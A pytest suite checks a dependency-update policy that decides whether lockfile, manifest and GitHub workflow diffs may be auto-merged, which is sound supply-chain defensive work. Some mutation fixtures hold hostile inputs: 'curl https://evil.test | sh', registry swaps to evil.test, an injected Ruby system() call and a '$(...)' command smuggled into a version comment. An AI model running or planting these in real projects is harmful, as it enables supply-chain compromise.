"""Behavioral contracts for dependency diff authorization."""

from __future__ import annotations

from collections.abc import Callable
from pathlib import Path

import pytest

from scripts.dependency_update_policy import assess_changes

ROOT = Path(__file__).resolve().parents[2]
SHA_A = "a" * 40
SHA_B = "b" * 40


def artifact(name: str, version: str, *, host: str = "files.pythonhosted.org") -> str:
    return (
        '{ url = "https://' + host + "/packages/ab/" + name + "-" + version + '.tar.gz", '
        'hash = "sha256:' + "1" * 64 + '", size = 123 }'
    )


def lock(version: str = "1.2.3", transitive: str = "2.3.4") -> str:
    return (
        'version = 1\nrevision = 5\nrequires-python = ">=3.12"\n'
        '[[package]]\nname = "demo"\nversion = "' + version + '"\n'
        'source = { registry = "https://pypi.org/simple" }\n'
        "sdist = " + artifact("demo", version) + "\n"
        'dependencies = [{ name = "child" }]\n'
        '[[package]]\nname = "child"\nversion = "' + transitive + '"\n'
        'source = { registry = "https://pypi.org/simple" }\n'
        "sdist = " + artifact("child", transitive) + "\n"
    )


def project(version: str = "1.2.3") -> str:
    return (
        '[project]\nname = "ring5"\nversion = "1.0.0"\nrequires-python = ">=3.12"\n'
        'dependencies = ["demo==' + version + '"]\n'
        '[build-system]\nrequires = ["setuptools==84.2.1"]\n'
        'build-backend = "setuptools.build_meta"\n'
    )


def ruby_lock(version: str = "4.4.1", child: str = "2.1.0") -> str:
    return (
        "GEM\n  remote: https://rubygems.org/\n  specs:\n"
        "    demo (" + version + ")\n      child (~> 2.0)\n"
        "    child (" + child + ")\n\nPLATFORMS\n  ruby\n\n"
        "DEPENDENCIES\n  demo (~> 4.4.1)\n\nBUNDLED WITH\n  4.0.23\n"
    )


def workflow(version: str = "v7.0.1", sha: str = SHA_A) -> str:
    return (
        "name: CI\non: pull_request\npermissions:\n  contents: read\njobs:\n"
        "  test:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: actions/checkout@" + sha + " # " + version + "\n"
        "      - run: make test\n"
    )


@pytest.mark.parametrize("new", ["1.2.4", "1.3.0", "1.2.3.1"])
def test_python_version_only_updates_are_eligible(new: str) -> None:
    decision = assess_changes(
        {"pyproject.toml": (project(), project(new)), "uv.lock": (lock(), lock(new))}
    )
    assert decision.eligible, decision.reasons
    assert [(x.ecosystem, x.name, x.previous, x.current) for x in decision.updates] == [
        ("uv", "demo", "1.2.3", new)
    ]


@pytest.mark.parametrize("new", ["2.0.0", "0.4.0"])
def test_breaking_versions_require_explicit_policy(new: str) -> None:
    old = "0.3.9" if new.startswith("0") else "1.9.9"
    changes = {"uv.lock": (lock(old), lock(new))}
    assert not assess_changes(changes).eligible
    assert assess_changes(changes, allow_major=True).eligible


@pytest.mark.parametrize(
    "new", ["1.2.2", "1.3.0rc1", "1.3.0.post1", "1!2.0", "1.3.0+local", "01.3.0", "garbage"]
)
def test_downgrades_and_unknown_versions_never_merge(new: str) -> None:
    decision = assess_changes({"uv.lock": (lock(), lock(new))}, allow_major=True)
    assert not decision.eligible
    assert decision.reasons


def test_grouped_transitive_major_blocks_otherwise_safe_direct_patch() -> None:
    decision = assess_changes({"uv.lock": (lock(), lock("1.2.4", "3.0.0"))})
    assert not decision.eligible
    assert {x.name for x in decision.updates} == {"demo", "child"}
    assert any("child" in reason for reason in decision.reasons)


def test_lock_only_transitive_minor_is_classified() -> None:
    decision = assess_changes({"uv.lock": (lock(), lock(transitive="2.4.0"))})
    assert decision.eligible, decision.reasons
    assert [(x.name, x.current) for x in decision.updates] == [("child", "2.4.0")]


@pytest.mark.parametrize(
    "mutation",
    [
        lambda text: text.replace('requires-python = ">=3.12"', 'requires-python = ">=3.13"'),
        lambda text: text.replace(
            'build-backend = "setuptools.build_meta"', 'build-backend = "evil.backend"'
        ),
        lambda text: text.replace("demo==", "demo>="),
        lambda text: text.replace("demo==", "other=="),
        lambda text: text + '\n[tool.uv.sources]\ndemo = { git = "https://evil.test/repo" }\n',
    ],
)
def test_project_configuration_cannot_hide_in_version_update(
    mutation: Callable[[str], str],
) -> None:
    decision = assess_changes(
        {
            "pyproject.toml": (project(), mutation(project("1.2.4"))),
            "uv.lock": (lock(), lock("1.2.4")),
        }
    )
    assert not decision.eligible


def test_direct_python_update_requires_lock_and_build_pin_can_stand_alone() -> None:
    assert not assess_changes({"pyproject.toml": (project(), project("1.2.4"))}).eligible
    decision = assess_changes(
        {"pyproject.toml": (project(), project().replace("84.2.1", "84.2.2"))}
    )
    assert decision.eligible, decision.reasons
    assert decision.updates[0].name == "setuptools"


@pytest.mark.parametrize(
    "mutation",
    [
        lambda text: text.replace("https://pypi.org/simple", "https://evil.test/simple"),
        lambda text: text.replace(
            'registry = "https://pypi.org/simple"', 'git = "https://evil.test/repo"'
        ),
        lambda text: text.replace("files.pythonhosted.org", "files.pythonhosted.org.evil.test"),
        lambda text: text.replace(
            "https://files.pythonhosted.org", "http://files.pythonhosted.org"
        ),
        lambda text: text.replace(
            "https://files.pythonhosted.org", "https://evil@files.pythonhosted.org"
        ),
        lambda text: text.replace("/packages/ab/", "/packages/../"),
        lambda text: text.replace("sha256:", "md5:"),
        lambda text: text.replace("size = 123", "size = true"),
        lambda text: text.replace("revision = 5", "revision = 6"),
        lambda text: text + '\n[evil]\ncommand = "touch /tmp/policy-executed"\n',
    ],
)
def test_lock_source_artifact_and_schema_substitutions_are_rejected(
    mutation: Callable[[str], str],
) -> None:
    assert not assess_changes({"uv.lock": (lock(), mutation(lock("1.2.4")))}).eligible


def test_same_version_artifact_replacement_never_becomes_release_update() -> None:
    decision = assess_changes({"uv.lock": (lock(), lock().replace("1" * 64, "2" * 64))})
    assert not decision.eligible
    assert decision.updates == ()


def test_package_addition_requires_review() -> None:
    extra = (
        '\n[[package]]\nname = "extra"\nversion = "1.0.0"'
        '\nsource = { registry = "https://pypi.org/simple" }\nsdist = '
        + artifact("extra", "1.0.0")
        + "\n"
    )
    assert not assess_changes({"uv.lock": (lock(), lock("1.2.4") + extra)}).eligible


def test_ruby_transitive_update_is_classified_without_executing_gemfile() -> None:
    decision = assess_changes({"Gemfile.lock": (ruby_lock(), ruby_lock(child="2.2.0"))})
    assert decision.eligible, decision.reasons
    assert [(x.ecosystem, x.name, x.current) for x in decision.updates] == [
        ("bundler", "child", "2.2.0")
    ]


@pytest.mark.parametrize(
    "mutation",
    [
        lambda text: text.replace("https://rubygems.org/", "https://evil.test/"),
        lambda text: text.replace("GEM\n", "GIT\n"),
        lambda text: text.replace("  ruby\n", "  x86_64-linux\n"),
        lambda text: text.replace("  4.0.23\n", "  4.0.24\n"),
        lambda text: text + "\nRUBY VERSION\n  ruby 3.4.0\n",
    ],
)
def test_ruby_source_platform_and_runtime_changes_escalate(mutation: Callable[[str], str]) -> None:
    assert not assess_changes(
        {"Gemfile.lock": (ruby_lock(), mutation(ruby_lock(child="2.2.0")))}
    ).eligible


def test_gemfile_executable_injection_and_constraint_relaxation_are_rejected() -> None:
    before = 'source "https://rubygems.org"\ngem "demo", "~> 4.4.1"\n'
    after = before.replace("4.4.1", "4.4.2")
    good = ruby_lock("4.4.2").replace("demo (~> 4.4.1)", "demo (~> 4.4.2)")
    assert assess_changes(
        {"Gemfile": (before, after), "Gemfile.lock": (ruby_lock(), good)}
    ).eligible
    for bad in [
        after + 'system("touch /tmp/policy-executed")\n',
        after.replace("~>", ">="),
        after.replace('"~> 4.4.2"', 'ENV["VERSION"]'),
    ]:
        assert not assess_changes(
            {"Gemfile": (before, bad), "Gemfile.lock": (ruby_lock(), good)}
        ).eligible


def test_action_update_retains_exact_provenance() -> None:
    decision = assess_changes({".github/workflows/ci.yml": (workflow(), workflow("v7.0.2", SHA_B))})
    assert decision.eligible, decision.reasons
    update = decision.updates[0]
    assert (update.ecosystem, update.name, update.action_repository) == (
        "github-actions",
        "actions/checkout",
        "actions/checkout",
    )
    assert (update.previous, update.current) == ("7.0.1", "7.0.2")
    assert (update.previous_ref, update.new_ref, update.previous_tag, update.new_tag) == (
        SHA_A,
        SHA_B,
        "v7.0.1",
        "v7.0.2",
    )


@pytest.mark.parametrize(
    "mutation",
    [
        lambda text: text.replace(SHA_B, "v7"),
        lambda text: text.replace("actions/checkout", "evil/checkout"),
        lambda text: text.replace("contents: read", "contents: write"),
        lambda text: text.replace("make test", "curl https://evil.test | sh"),
        lambda text: text.replace("on: pull_request", "on: pull_request_target"),
        lambda text: text.replace("# v7.0.2", "# v7.0.2; $(touch /tmp/policy-executed)"),
        lambda text: text.replace("# v7.0.2", "# v7.0.2rc1"),
        lambda text: text.replace(SHA_B, SHA_A),
        lambda text: text.replace("v7.0.2", "v7.0.1"),
    ],
)
def test_workflow_only_allows_sha_and_version_comment_replacement(
    mutation: Callable[[str], str],
) -> None:
    assert not assess_changes(
        {".github/workflows/ci.yml": (workflow(), mutation(workflow("v7.0.2", SHA_B)))}
    ).eligible


def test_fake_uses_inside_executable_scalar_is_not_an_action_update() -> None:
    old = workflow().replace(
        "      - run: make test",
        "      - run: |\n          uses: actions/checkout@" + SHA_A + " # v7.0.1",
    )
    new = old.replace(
        "          uses: actions/checkout@" + SHA_A + " # v7.0.1",
        "          uses: actions/checkout@" + SHA_B + " # v7.0.2",
    )
    assert not assess_changes({".github/workflows/ci.yml": (old, new)}).eligible


@pytest.mark.parametrize(
    "path",
    [
        "../pyproject.toml",
        ".github/workflows/new.yml",
        ".github/copilot-instructions.md",
        "AGENTS.md",
        "scripts/dependency_update_policy.py",
    ],
)
def test_non_dependency_scope_is_never_auto_eligible(path: str) -> None:
    assert not assess_changes({path: ("old", "new")}).eligible


@pytest.mark.parametrize(
    "changes",
    [
        {},
        {"uv.lock": ("bad", "[invalid")},
        {"pyproject.toml": ("", "[")},
        {"Gemfile": ("", "\x00")},
        {"uv.lock": (lock(), lock())},
    ],
)
def test_empty_malformed_and_no_op_inputs_fail_closed(changes: dict[str, tuple[str, str]]) -> None:
    decision = assess_changes(changes)
    assert not decision.eligible
    assert decision.reasons


def test_current_real_python_manifest_and_lock_roundtrip() -> None:
    before_project = (ROOT / "pyproject.toml").read_text()
    before_lock = (ROOT / "uv.lock").read_text()
    assert "black==26.10.1" in before_project
    changes = {
        "pyproject.toml": (before_project, before_project.replace("26.10.1", "26.10.2")),
        "uv.lock": (before_lock, before_lock.replace("26.10.1", "26.10.2")),
    }
    decision = assess_changes(changes)
    assert decision.eligible, decision.reasons
    assert [(x.name, x.current) for x in decision.updates] == [("black", "26.10.2")]


def test_current_real_gem_lock_platforms_and_workflow_shape() -> None:
    gemlock = (ROOT / "Gemfile.lock").read_text()
    decision = assess_changes(
        {
            "Gemfile.lock": (
                gemlock,
                gemlock.replace("public_suffix (7.0.5)", "public_suffix (7.0.6)"),
            )
        }
    )
    assert decision.eligible, decision.reasons
    for filename in ["ci", "codeql", "pages"]:
        path = f".github/workflows/{filename}.yml"
        before = (ROOT / path).read_text()
        after = before.replace(
            "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1", SHA_B + " # v7.0.2"
        )
        decision = assess_changes({path: (before, after)})
        assert decision.eligible, decision.reasons


def test_exact_python_pin_and_local_lock_metadata_must_agree() -> None:
    decision = assess_changes(
        {"pyproject.toml": (project(), project("1.2.4")), "uv.lock": (lock(), lock("1.2.5"))}
    )
    assert not decision.eligible
    assert any("declared requirement" in reason for reason in decision.reasons)
    before = (ROOT / "uv.lock").read_text()
    decision = assess_changes({"uv.lock": (before, before.replace("26.10.1", "26.10.2"))})
    assert not decision.eligible
    assert any("matching pyproject" in reason for reason in decision.reasons)


@pytest.mark.parametrize(
    "mutation",
    [
        lambda text: text.replace('child" }', 'absent" }'),
        lambda text: text.replace("demo-1.2.4.tar.gz", "demo-1.2.40.tar.gz"),
        lambda text: text.replace("version = 1\n", "version = true\n", 1),
        lambda text: text.replace('requires-python = ">=3.12"', "requires-python = 42"),
        lambda text: text.replace(
            'dependencies = [{ name = "child" }]',
            'dependencies = [{ name = "child", executable = "danger" }]',
        ),
    ],
)
def test_malformed_dependency_graph_and_release_identity_are_rejected(
    mutation: Callable[[str], str],
) -> None:
    assert not assess_changes({"uv.lock": (lock(), mutation(lock("1.2.4")))}).eligible


def test_duplicate_locked_package_and_unsupported_version_are_visible() -> None:
    duplicated = (
        lock("1.2.4") + '\n[[package]]\nname = "DEMO"\nversion = "1.2.4"'
        '\nsource = { registry = "https://pypi.org/simple" }\nsdist = '
        + artifact("demo", "1.2.4")
        + "\n"
    )
    assert not assess_changes({"uv.lock": (lock(), duplicated)}).eligible
    unknown = lock("1.2.4").replace('version = "1.2.4"', "version = 42")
    assert not assess_changes({"uv.lock": (lock(), unknown)}).eligible


def test_ruby_manifest_and_lock_constraints_cannot_disagree() -> None:
    before = 'source "https://rubygems.org"\ngem "demo", "~> 4.4.1"\n'
    after = before.replace("4.4.1", "4.4.2")
    assert not assess_changes(
        {"Gemfile": (before, after), "Gemfile.lock": (ruby_lock(), ruby_lock("4.4.2"))}
    ).eligible
    assert not assess_changes(
        {"Gemfile.lock": (ruby_lock(), ruby_lock("5.0.0"))}, allow_major=True
    ).eligible


def test_unknown_and_duplicated_ruby_lock_sections_are_manual() -> None:
    for head in [
        ruby_lock(child="2.2.0").replace("PLATFORMS\n", ""),
        ruby_lock(child="2.2.0") + "\nGEM\n",
        ruby_lock(child="2.2.0") + "\nCHECKSUMS\n  demo deadbeef\n",
    ]:
        assert not assess_changes({"Gemfile.lock": (ruby_lock(), head)}).eligible


def test_allow_major_requires_an_actual_boolean() -> None:
    decision = assess_changes(
        {"uv.lock": (lock(), lock("2.0.0"))},
        allow_major="false",  # type: ignore[arg-type]
    )
    assert not decision.eligible
    assert any("explicit boolean" in reason for reason in decision.reasons)


@pytest.mark.parametrize(
    ("operator", "valid", "invalid"),
    [
        ("===", "1.2.4", "1.2.4.0"),
        ("<=", "1.2.4", "1.2.5"),
        ("<", "1.2.3", "1.2.4"),
        ("!=", "1.2.5", "1.2.4"),
        (">=", "1.2.5", "1.2.3"),
        (">", "1.2.5", "1.2.4"),
        ("~=", "1.2.5", "1.3.0"),
    ],
)
def test_python_comparison_operators_validate_the_actual_lock(
    operator: str, valid: str, invalid: str
) -> None:
    before = project().replace("demo==1.2.3", "demo" + operator + "1.2.3")
    after = project().replace("demo==1.2.3", "demo" + operator + "1.2.4")
    old_version = "1.2.2" if operator in {"<", "<="} else "1.2.3"
    good = assess_changes(
        {"pyproject.toml": (before, after), "uv.lock": (lock(old_version), lock(valid))}
    )
    assert good.eligible, good.reasons
    bad = assess_changes(
        {
            "pyproject.toml": (before, after),
            "uv.lock": (lock(old_version), lock(invalid, transitive="2.3.5")),
        }
    )
    assert not bad.eligible
    assert any("declared requirement" in reason for reason in bad.reasons)


def test_unchanged_local_pin_and_absent_nonexact_requirement_cannot_be_skipped() -> None:
    before = (ROOT / "uv.lock").read_text()
    after = before.replace('version = "26.10.1"', 'version = "26.10.2"').replace(
        "black-26.10.1", "black-26.10.2"
    )
    assert not assess_changes({"uv.lock": (before, after)}).eligible
    old = project().replace("demo==", "missing>=")
    new = old.replace("1.2.3", "1.2.4")
    assert not assess_changes(
        {"pyproject.toml": (old, new), "uv.lock": (lock(), lock("1.2.4"))}
    ).eligible


def test_local_metadata_cannot_override_the_new_project_requirement() -> None:
    before_project = (ROOT / "pyproject.toml").read_text()
    before_lock = (ROOT / "uv.lock").read_text()
    after_lock = before_lock.replace('version = "26.10.1"', 'version = "26.10.2"').replace(
        "black-26.10.1", "black-26.10.2"
    )
    decision = assess_changes(
        {
            "pyproject.toml": (
                before_project,
                before_project.replace("black==26.10.1", "black==26.10.2"),
            ),
            "uv.lock": (before_lock, after_lock),
        }
    )
    assert not decision.eligible
    assert any("local metadata does not match" in reason for reason in decision.reasons)


@pytest.mark.parametrize("tag", ["7.0.1", "v7.0.1.0"])
def test_grouped_action_update_cannot_hide_an_unclassified_sha_replacement(tag: str) -> None:
    before = workflow() + "      - uses: actions/setup-python@" + SHA_A + " # v7.1.0\n"
    after = workflow(tag, SHA_B) + "      - uses: actions/setup-python@" + SHA_B + " # v7.1.1\n"
    decision = assess_changes({".github/workflows/ci.yml": (before, after)})
    assert not decision.eligible
    assert any("without a release change" in reason for reason in decision.reasons)


def test_equivalent_python_release_spelling_is_not_an_unreviewed_artifact_change() -> None:
    decision = assess_changes({"uv.lock": (lock(), lock("1.2.3.0", "2.3.5"))})
    assert not decision.eligible
    assert any("equivalent version spellings" in reason for reason in decision.reasons)


@pytest.mark.parametrize(("operator", "eligible"), [("==", True), ("===", False)])
def test_literal_python_equality_preserves_release_spelling(operator: str, eligible: bool) -> None:
    before = project().replace("demo==1.2.3", "demo" + operator + "1.2.3")
    after = project().replace("demo==1.2.3", "demo" + operator + "1.2.4")
    decision = assess_changes(
        {"pyproject.toml": (before, after), "uv.lock": (lock(), lock("1.2.4.0"))}
    )
    assert decision.eligible is eligible, decision.reasons
